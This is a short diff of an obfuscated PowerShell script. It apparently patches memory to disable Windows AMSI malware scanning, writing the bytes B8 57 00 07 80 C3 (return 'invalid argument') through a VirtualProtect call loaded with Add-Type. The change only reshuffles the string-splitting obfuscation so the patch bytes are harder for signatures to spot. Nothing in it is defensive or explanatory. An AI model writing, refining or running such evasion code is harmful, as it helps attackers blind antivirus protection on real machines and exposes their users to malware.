@@ -1,9 +1,4 @@
-$vxck = "0x"+"B8"
-$uixn = "0x"+"57"
-$bxny = "0x"+"00"
-$rxqr = "0x"+"07"
-$yzex = "0"+"x8"+"0"
-$gbrq = "0x"+"C"+"3"
+
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
@@ -22,7 +17,7 @@ $hh = @"
 Protect(IntPtr lpAddress, UIntPtr odwsuy, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-$acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)
+$acyyr = [Byte[]] ("0x"+"B8","0x"+"57","0"+"x"+"0"+"0","0x"+"07",+"0"+"x8"+"0",+"0x"+"C"+"3")
 $afrcv = $ahh+$hh
 
 Add-type -TypeDefinition $afrcv
